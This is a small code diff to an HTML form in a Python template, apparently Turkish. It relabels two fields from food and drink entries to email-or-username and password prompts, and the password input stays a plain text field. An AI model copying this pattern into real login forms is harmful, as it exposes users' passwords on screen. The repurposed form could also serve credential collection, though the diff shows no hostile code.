@@ -110,10 +110,10 @@ HTML = """
 
         <form method="POST">
             <label for="urun1">e posta</label>
-            <input type="text" id="urun1" name="urun1" placeholder="Buraya yiyecek yaz">
+            <input type="text" id="urun1" name="urun1" placeholder="eposta veya kullanıcı adı">
 
             <label for="urun2">şifre</label>
-            <input type="text" id="urun2" name="urun2" placeholder="Buraya içecek yaz">
+            <input type="text" id="urun2" name="urun2" placeholder="şifre giriniz">
 
             <button type="submit">Gönder</button>
         </form>
